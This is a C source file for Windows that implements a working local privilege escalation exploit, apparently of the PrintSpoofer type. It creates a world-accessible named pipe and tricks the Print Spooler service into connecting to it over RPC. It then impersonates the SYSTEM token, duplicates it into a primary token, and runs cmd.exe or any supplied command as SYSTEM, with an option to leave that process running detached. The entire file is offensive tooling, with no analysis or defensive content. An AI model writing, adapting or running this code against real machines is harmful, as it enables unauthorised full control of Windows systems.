#include <errhandlingapi.h>
#include <fileapi.h>
#include <handleapi.h>
#include <minwinbase.h>
#include <minwindef.h>
#include <namedpipeapi.h>
#include <processthreadsapi.h>
#include <rpc.h>
#include <rpcdce.h>
#include <stringapiset.h>
#include <synchapi.h>
#include <wchar.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winerror.h>
#include <winnls.h>
#include <winnt.h>
#include <sddl.h>
#include <x86gprintrin.h>
#include "ms-rprn_h.h"

static char g_uuid[64];
static char g_pipeName[256];


void __RPC_FAR *__RPC_USER midl_user_allocate(size_t cBytes) {
  return malloc(cBytes);
}

void __RPC_USER midl_user_free(void __RPC_FAR *p) {
  free(p);
}

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr) {
  RPC_STATUS RpcStatus;
  RPC_WSTR StringBinding;
  handle_t BindingHandle;

  if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB",
                               (RPC_WSTR)L"ncacn_np",
                               (RPC_WSTR)lpStr,
                               (RPC_WSTR)L"\\pipe\\spoolss",
                               NULL, &StringBinding) != RPC_S_OK)
    return NULL;

  RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
  RpcStringFreeW(&StringBinding);

  if (RpcStatus != RPC_S_OK)
    return NULL;

  return BindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle) {
  RpcBindingFree(&BindingHandle);
}

static void PrintTokenInfo(HANDLE hToken) {
  DWORD needed = 0;
  GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
  if (needed == 0) {
    printf("[-]TokenUser size query failed: %lu\n", GetLastError());
    return;
  }

  PTOKEN_USER ptu = (PTOKEN_USER)malloc(needed);
  if (!ptu)
    return;

  if (GetTokenInformation(hToken, TokenUser, ptu, needed, &needed)) {
    LPSTR sidStr = NULL;
    if (ConvertSidToStringSidA(ptu->User.Sid, &sidStr)) {
      printf("[+] SID : %s\n", sidStr);
      char name[256] = {0}, domain[256] = {0};
      DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
      SID_NAME_USE use;
      if (LookupAccountSidA(NULL, ptu->User.Sid, name, &nameLen, domain, &domainLen, &use)) {
        printf("[+] Account: %s\\%s\n", domain, name);
      }
      LocalFree(sidStr);
    } else {
      printf("[-] ConvertSidToStringSidA failed: %lu\n", GetLastError());
    }
  } else {
    printf("[-] GetTokenInformation(TokenUser) failed: %lu\n", GetLastError());
  }

  free(ptu);

  TOKEN_TYPE tt = 0;
  DWORD cb = sizeof(tt);
  if (GetTokenInformation(hToken, TokenType, &tt, cb, &cb)) {
    printf("[+] Type  : %s\n", tt == TokenPrimary ? "Primary" : "Impersonation");
  }

  if (tt == TokenImpersonation) {
    SECURITY_IMPERSONATION_LEVEL lvl;
    cb = sizeof(lvl);
    if (GetTokenInformation(hToken, TokenImpersonationLevel, &lvl, cb, &cb)) {
      static const char *lvlStr[] = {"Anonymous", "Identification", "Impersonation", "Delegation"};
      if (lvl <= SecurityDelegation) {
        printf("[+] Level : %s\n", lvlStr[lvl]);
      }
    }
  }

  TOKEN_ELEVATION elev = {0};
  cb = sizeof(elev);
  if (GetTokenInformation(hToken, TokenElevation, &elev, cb, &cb)) {
    printf("[+] Elevated : %s\n", elev.TokenIsElevated ? "YES" : "NO");
  }
}


EXCEPTION_DISPOSITION
rpc_except_handler(struct _EXCEPTION_RECORD *pRecord, void *pFrame,
                   struct _CONTEXT *pContext, void *pDispatcher) {
  (void)pRecord; (void)pFrame; (void)pContext; (void)pDispatcher;
  return ExceptionExecuteHandler;
}

static DWORD WINAPI TriggerThread(LPVOID lpParam) {
    (void)lpParam;

    Sleep(500);
    printf("[*] TriggerThread: using Spooler RPC trigger\n");

    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(hostname, &len);

    wchar_t targetServer[MAX_PATH] = {0};
    _snwprintf(targetServer, MAX_PATH, L"\\\\%ws", hostname);

    wchar_t captureServer[MAX_PATH] = {0};
    _snwprintf(captureServer, MAX_PATH, L"\\\\127.0.0.1/pipe/%hs", g_uuid);

    printf("[*] Spooler coerce capture server: %ls\n", captureServer);

    PRINTER_HANDLE hPrinter = NULL;
    DEVMODE_CONTAINER devmodeContainer = {0};

    __try1(rpc_except_handler)
    {
        if (RpcOpenPrinter(targetServer, &hPrinter, NULL, &devmodeContainer, 0) == RPC_S_OK) {
            RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB,
                                                          0, captureServer, 0, NULL);
            RpcClosePrinter(&hPrinter);
        } else {
            printf("[-] RpcOpenPrinter failed\n");
        }
    }
    __except1
    {
    }

    return 0;
}

int main(int argc, char **argv){
    UUID uuid;
    UuidCreate(&uuid);
    unsigned char *uuidStr = NULL;
    UuidToString(&uuid, &uuidStr);

    snprintf(g_uuid, sizeof(g_uuid), "%s", (char *)uuidStr);

    snprintf(g_pipeName, sizeof(g_pipeName),
        "\\\\.\\pipe\\%s\\pipe\\spoolss", g_uuid);

    RpcStringFree(&uuidStr);

    printf("[*] Pipe: %s\n", g_pipeName);

    SECURITY_DESCRIPTOR sd = {0};
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION) ||
        !ConvertStringSecurityDescriptorToSecurityDescriptorA(
            "D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &sa.lpSecurityDescriptor, NULL)) {
        printf("[-] Failed to build pipe security descriptor: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hPipe = CreateNamedPipeA(g_pipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,  PIPE_TYPE_BYTE | PIPE_WAIT,10, 2048, 2048, 0, &sa);

    if (hPipe == INVALID_HANDLE_VALUE){
        printf("[-] CreateNamedPipeA failed. %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Pipe created, waiting for SYSTEM to connect...\n");

    HANDLE hThread = CreateThread(NULL, 0, TriggerThread, NULL, 0, NULL);
    if (!hThread){
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
    OVERLAPPED ov = {0};
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

    if (!ConnectNamedPipe(hPipe, &ov)) {
        DWORD e = GetLastError();
        if (e != ERROR_IO_PENDING && e != ERROR_PIPE_CONNECTED) {
            printf("[-] ConnectNamedPipe failed: %lu\n", e);
            CloseHandle(ov.hEvent);
            CloseHandle(hThread);
            CloseHandle(hPipe);
            return 1;
        }
        if (e == ERROR_PIPE_CONNECTED)
            SetEvent(ov.hEvent);
    }

    DWORD wait = WaitForSingleObject(ov.hEvent, 5000);
    if (wait == WAIT_TIMEOUT) {
        printf("[-] Timed out — SYSTEM never connected to pipe\n");
        printf("[-] Spooler trigger likely failed, check Print Spooler service\n");
        CloseHandle(ov.hEvent);
        CloseHandle(hThread);
        CloseHandle(hPipe);
        return 1;
}

    DWORD transferred = 0;
    GetOverlappedResult(hPipe, &ov, &transferred, FALSE);
    CloseHandle(ov.hEvent);

    ULONG clientPid = 0;
    GetNamedPipeClientProcessId(hPipe, &clientPid);
    printf("[+] Client connected! PID: %lu\n", clientPid);

    char buf[64] = {0};
    DWORD cb = 0;
    ReadFile(hPipe, buf, sizeof(buf) - 1, &cb, NULL);

    if (!ImpersonateNamedPipeClient(hPipe)) {
      printf("[-] ImpersonateNamedPipeClient failed: %lu\n", GetLastError());
      CloseHandle(hThread);
      CloseHandle(hPipe);
      return 1;
    }
    printf("[+] Impersonating pipe client\n");

    HANDLE hThreadTok = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE,
                         FALSE, &hThreadTok)) {
      printf("[-] OpenThreadToken failed: %lu\n", GetLastError());
      RevertToSelf();
      CloseHandle(hThread);
      CloseHandle(hPipe);
      return 1;
    }
    printf("\n--- Token From Pipe client (PID %lu) ---\n", clientPid);
    PrintTokenInfo(hThreadTok);

    SECURITY_IMPERSONATION_LEVEL lvl;
    DWORD cbLvl = sizeof(lvl);
    if (!GetTokenInformation(hThreadTok, TokenImpersonationLevel, &lvl, cbLvl,
                             &cbLvl) ||
        lvl < SecurityImpersonation) {
      printf("[!] token level is too low %d - unusable.\n", lvl);
      CloseHandle(hThreadTok);
      RevertToSelf();
      CloseHandle(hThread);
      CloseHandle(hPipe);
      return 1;
    }

    printf("[+] Impersonation level OK: %d (>= SecurityImpersonation)\n", lvl);

    HANDLE hPrimary = NULL;
    if (!DuplicateTokenEx(hThreadTok, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenPrimary, &hPrimary)) {
      printf("[-]DuplicateTokenEx failed: %lu\n", GetLastError());
      CloseHandle(hThreadTok);
      RevertToSelf();
      CloseHandle(hThread);
      CloseHandle(hPipe);
      return 1;
    }

    printf("[+] primary token forged\n");
    PrintTokenInfo(hPrimary);

    RevertToSelf();
    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    SetTokenInformation(hPrimary, TokenSessionId, &sessionId, sizeof(sessionId));

    BOOL        detach = FALSE;
    const char *cmdArg = NULL;

    if (argc > 2 && (strcmp(argv[1], "-d") == 0 || strcmp(argv[1], "/d") == 0)) {
      detach = TRUE;
      cmdArg = argv[2];
    } else if (argc > 1) {
      cmdArg = argv[1];
    }

    if (detach)
      printf("[*] Mode: DETACH (spawn & forget, no output capture)\n");

    SECURITY_ATTRIBUTES psa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

    HANDLE hReadPipe = NULL, hWritePipe = NULL;

    if (!detach) {
      if (!CreatePipe(&hReadPipe, &hWritePipe,&psa , 0)){
        printf("[-] CreatePipe failed: %lu\n", GetLastError());
        CloseHandle(hPrimary);
        CloseHandle(hThreadTok);
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
        WaitForSingleObject(hThread, 3000);
        CloseHandle(hThread);
        return 1;
      }
      /* child must NOT inherit the read end, or ReadFile never sees EOF */
      SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    }

    HANDLE hNul = INVALID_HANDLE_VALUE;
    if (detach) {
      hNul = CreateFileW(L"NUL", GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, &psa,
                         OPEN_EXISTING, 0, NULL);
      if (hNul == INVALID_HANDLE_VALUE) {
        printf("[-] Open NUL failed: %lu\n", GetLastError());
        CloseHandle(hPrimary);
        CloseHandle(hThreadTok);
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
        WaitForSingleObject(hThread, 3000);
        CloseHandle(hThread);
        return 1;
      }
    }

    wchar_t app[] = L"C:\\Windows\\System32\\cmd.exe";
    wchar_t cmdline[512];

    if (detach) {
      wchar_t userCmd[448] = {0};
      MultiByteToWideChar(CP_ACP, 0, cmdArg, -1, userCmd, 447);

      _snwprintf(cmdline, 512, L"%ls", userCmd);
    } else if (cmdArg) {
      wchar_t userCmd[448] = {0};
      MultiByteToWideChar(CP_ACP, 0, cmdArg, -1, userCmd, 447);
      _snwprintf(cmdline, 512, L"\"%ls\" /c %ls", app, userCmd);
    } else {
      _snwprintf(cmdline, 512, L"%ls", app);
    }

    STARTUPINFOW si = {sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;

    if (detach) {
      si.hStdInput  = hNul;
      si.hStdOutput = hNul;
      si.hStdError  = hNul;
    } else {
      si.hStdOutput = hWritePipe;
      si.hStdError  = hWritePipe;
      si.hStdInput  = NULL;
    }
    PROCESS_INFORMATION pi = {0};

    LPCWSTR lpAppName = detach ? NULL : app;

    DWORD createFlags = CREATE_NO_WINDOW;

    BOOL ok;
    if (detach) {

      ok = CreateProcessWithTokenW(hPrimary, 0, lpAppName,
                                   cmdline,
                                   createFlags | CREATE_BREAKAWAY_FROM_JOB,
                                   NULL, NULL, &si, &pi);
      if (!ok && GetLastError() == ERROR_ACCESS_DENIED) {
        printf("[*] breakaway not allowed by job, spawning inside it\n");
        memset(&pi, 0, sizeof(pi));
        ok = CreateProcessWithTokenW(hPrimary, 0, lpAppName,
                                     cmdline, createFlags,
                                     NULL, NULL, &si, &pi);
      }
    } else {
      ok = CreateProcessWithTokenW(hPrimary, 0, lpAppName,
                                   cmdline, createFlags, NULL, NULL, &si, &pi);
    }

    if (!ok){
      DWORD e = GetLastError();
      printf("[-] CreateProcessWithTokenW failed: %lu\n", e);
      if (e == 1314){
        printf("-> need SeImpersonatePrivilege\n");
      }
    } else {
      printf("[+] SYSTEM process spawned! PID: %lu\n", pi.dwProcessId);

      if (detach) {
        printf("[+] detached - payload keeps running as SYSTEM, exiting now\n");
      } else {

        CloseHandle(hWritePipe);

        printf("[>] --- output ---\n");

        WaitForSingleObject(pi.hProcess, 5000);

        char outbuf[4096];
        DWORD bytesRead;
        while (ReadFile(hReadPipe, outbuf, sizeof(outbuf)-1, &bytesRead, NULL) && bytesRead > 0){
          outbuf[bytesRead] = '\0';
          printf("%s", outbuf);
        }
      }
    }

    if (hWritePipe) CloseHandle(hWritePipe);
    if (hReadPipe)  CloseHandle(hReadPipe);
    if (hNul != INVALID_HANDLE_VALUE) CloseHandle(hNul);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);

    CloseHandle(hPrimary);
    CloseHandle(hThreadTok);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
}
